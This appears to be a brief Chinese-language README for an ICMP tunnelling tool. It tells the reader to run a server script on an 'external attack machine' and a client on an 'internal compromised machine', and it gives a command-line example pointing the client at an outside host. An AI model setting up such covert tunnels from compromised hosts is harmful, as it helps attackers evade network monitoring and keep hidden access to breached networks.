# Icmp_tunnel ICMP隧道 
运行环境：python2  
外网攻击机：python IcmpTunnel_S.py  
内网失陷机：python IcmpTunnel_C.py 外网攻击机IP 内网失陷机IP 端口号  
```shell
python IcmpTunnel_C.py 1.1.1.1 127.0.0.1 80
```
案例：[隐藏通信隧道技术-ICMP隧道-协议解析-1](https://mp.weixin.qq.com/s/gN3Pjlo8T1aDSSUoABiLNg)